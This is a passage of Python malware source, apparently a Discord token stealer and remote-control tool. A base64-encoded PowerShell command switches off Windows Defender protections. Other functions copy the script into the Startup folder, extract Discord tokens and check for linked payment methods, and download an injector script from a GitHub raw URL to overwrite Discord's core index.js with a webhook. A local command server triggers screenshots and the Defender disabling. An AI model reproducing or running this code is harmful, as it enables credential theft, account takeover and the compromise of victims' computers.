    b"cG93ZXJzaGVsbC5leGUgU2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZUludHJ1c2lvblByZXZlbnRpb25TeXN0ZW0gJHRydWUgLURpc2FibGVJT0FWUHJvdGVjdGlvbiAkdHJ1ZSAtRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAkdHJ1ZSAtRGlzYWJsZVNjcmlwdFNjYW5uaW5nICR0cnVlIC1FbmFibGVDb250cm9sbGVkRm9sZGVyQWNjZXNzIERpc2FibGVkIC1FbmFibGVOZXR3b3JrUHJvdGVjdGlvbiBBdWRpdE1vZGUgLUZvcmNlIC1NQVBTUmVwb3J0aW5nIERpc2FibGVkIC1TdWJtaXRTYW1wbGVzQ29uc2VudCBOZXZlclNlbmQgJiYgcG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1TdWJtaXRTYW1wbGVzQ29uc2VudCAyICYgcG93ZXJzaGVsbC5leGUgLWlucHV0Zm9ybWF0IG5vbmUgLW91dHB1dGZvcm1hdCBub25lIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAlVVNFUlBST0ZJTEUlXEFwcERhdGEiICYgcG93ZXJzaGVsbC5leGUgLWlucHV0Zm9ybWF0IG5vbmUgLW91dHB1dGZvcm1hdCBub25lIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAlVVNFUlBST0ZJTEUlXExvY2FsIiAmIHBvd2Vyc2hlbGwuZXhlIC1jb21tYW5kICJTZXQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25FeHRlbnNpb24gJy5leGUnIiAK"
).decode()
    subprocess.run(cmd, shell=True, capture_output=True)

def add_to_startup():
    startup_folder = os.path.join(
        os.getenv("APPDATA"),
        "Microsoft",
        "Windows",
        "Start Menu",
        "Programs",
        "Startup",
    )
    script_name = sys.argv[0]
    if any(file.lower().endswith(".lnk") for file in os.listdir(startup_folder)):
        print("Script is already in the startup folder.")
    else:
        script_path = os.path.abspath(sys.argv[0])
        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        script_name = os.path.basename(script_path)

        if any(filename.lower() == script_name.lower() for filename in os.listdir(startup_folder)):
            print('Script is already in the startup folder.')
        else:
            shutil.copy(script_path, startup_folder)
            with open(os.path.join(os.path.join(tempfile.gettempdir(), 'startup_added.txt')), 'w', encoding='utf-8') as f:
                f.write('Script added to startup')
            print('Script successfully added to startup.')

def injection():
    process_list = os.popen('tasklist').readlines()


    for process in process_list:
        if "Discord" in process:
            pid = int(process.split()[1])
            os.system(f"taskkill /F /PID {pid}")
    try:  
        inj3c710n_url = f"https://raw.githubusercontent.com/notauthorisedxd/blocked/main/discord_inject.js"
        username = os.getlogin()

        folder_list = ['Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment']

        for folder_name in folder_list:
            deneme_path = os.path.join(os.getenv('LOCALAPPDATA'), folder_name)
            if os.path.isdir(deneme_path):
                for subdir, dirs, files in os.walk(deneme_path):
                    if 'app-' in subdir:
                        for dir in dirs:
                            if 'modules' in dir:
                                module_path = os.path.join(subdir, dir)
                                for subsubdir, subdirs, subfiles in os.walk(module_path):
                                    if 'discord_desktop_core-' in subsubdir:
                                        for subsubsubdir, subsubdirs, subsubfiles in os.walk(subsubdir):
                                            if 'discord_desktop_core' in subsubsubdir:
                                                for file in subsubfiles:
                                                    if file == 'index.js':
                                                        file_path = os.path.join(subsubsubdir, file)

                                                        injeCTmED0cT0r_cont = requests.get(inj3c710n_url).text

                                                        injeCTmED0cT0r_cont = injeCTmED0cT0r_cont.replace("%WEBHOOK%", url)

                                                        with open(file_path, "w", encoding="utf-8") as index_file:
                                                            index_file.write(injeCTmED0cT0r_cont)
    except Exception as e:
        print(e)
        time.sleep(20)

def start_server():
    host = '127.0.0.1'  # localhost
    port = 12345  # Example port number

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((host, port))
        server_socket.listen()

        print("Server listening on {}:{}".format(host, port))

        while True:
            conn, addr = server_socket.accept()
            print('Connected by', addr)
            
            data = conn.recv(1024).decode()
            if data:
                print("Received command:", data)
                # Execute command and get response
                response = execute_command(data)
                # Send response to the client that sent the command
                conn.sendall(response.encode())
            conn.close()

def execute_command(command):
    # Add more commands as needed
    if command.lower() == "open notepad":
        subprocess.Popen(["notepad.exe"])
        return "Notepad opened successfully."
    elif command.lower() == "startup":
        add_to_startup()
        return "Added to startup successfully."
    elif command.lower() == "screenshot":
        take_screenshot_and_send()
        return "Screenshot captured and sent successfully."
    elif command.lower() == "pc info":
        send_all_pc_info()
        return "PC info retrieved successfully."
    elif command.lower() == "disable defender":
        disable_windows_defender()
        return "Windows Defender disabled successfully."
    elif command.lower() == "get ip":
        get_ip_info()

def gettokens():
    try:
        app_data = os.getenv('APPDATA')
        path = app_data + "\\discord\\Local Storage\\leveldb"

        tokens = []

        for file_name in os.listdir(path):

            if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                continue

            for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:

                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):

                    for token in findall(regex, line):
                        tokens.append(token)
    except Exception as e:
        print(e)

    return tokens

def getheaders(token=None, content_type="application/json"):
    headers = {

        "Content-Type": content_type,

        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"

    }

    if token:
        headers.update({"Authorization": token})

    return headers

def has_payment_methods(token):
    try:

        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
        headers=getheaders(token))).read().decode())) > 0)

    except:

        pass


                

def send_all_info():
    send_all_pc_info()
    




async def main():
    await antivm_checks()
    add_to_startup()
    send_all_info()
    #injection()
    start_server()


asyncio.run(main())